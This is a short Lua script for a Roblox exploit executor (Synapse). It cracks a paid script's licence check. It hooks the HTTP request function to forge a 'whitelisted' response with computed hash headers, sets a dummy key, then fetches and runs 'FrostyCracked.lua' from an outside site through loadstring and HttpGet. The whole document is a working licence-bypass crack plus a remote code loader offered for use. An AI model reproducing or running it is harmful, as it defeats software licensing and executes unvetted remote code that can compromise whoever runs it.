local sha256 = function(uwu, uwu2) return syn.crypt.custom.hash("sha256", uwu2 .. uwu) end
local syn_request = syn.request
setreadonly(syn, false)
syn.request = function(tbl)
    if tbl.Url:match("check") and tbl.Url:match("ataias") then
        local reqBod = game:GetService("HttpService"):JSONDecode(tbl.Body)
        local expectedResponse = sha256(sha256(reqBod.Data2 .. reqBod.Key .. reqBod.Data3, "0729e9ae8b2969225cd4b4d847ae76160f6ffca2a9674826190af0735af1a002"), reqBod.Data1)
        return {
            StatusCode = 203,
            Headers = {
                a = expectedResponse,
                A = expectedResponse,
                b = "tostring",
                B = "tostring"
            },
            Body = "whitelisted"
        }
    end
    return syn_request(tbl)
end
setreadonly(syn, true)
getgenv().Key = "go the raptors!"
loadstring(game:HttpGet'https://ancestordevelopment.wtf/lua/FrostyCracked.lua')()
